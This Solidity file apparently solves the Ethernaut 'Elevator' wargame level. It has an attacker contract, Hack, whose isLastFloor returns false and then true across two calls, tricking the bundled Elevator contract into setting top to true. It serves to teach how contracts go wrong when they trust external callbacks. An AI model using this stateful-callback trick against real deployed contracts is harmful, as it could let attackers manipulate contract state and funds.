// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Hack {
    Elevator private immutable elevator;
    uint private count;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function attack() public {
        elevator.goTo(1); // Calls the goTo function of the Elevator contract
        require(elevator.top(), "Not at the top floor"); // Ensures elevator reached the top
    }

    // Corrected: Return type should be bool to match the interface
    function isLastFloor(uint) public returns (bool) {
        count++;
        return count > 1; // The second time this is called, it returns true, simulating reaching the top floor
    }
}



contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
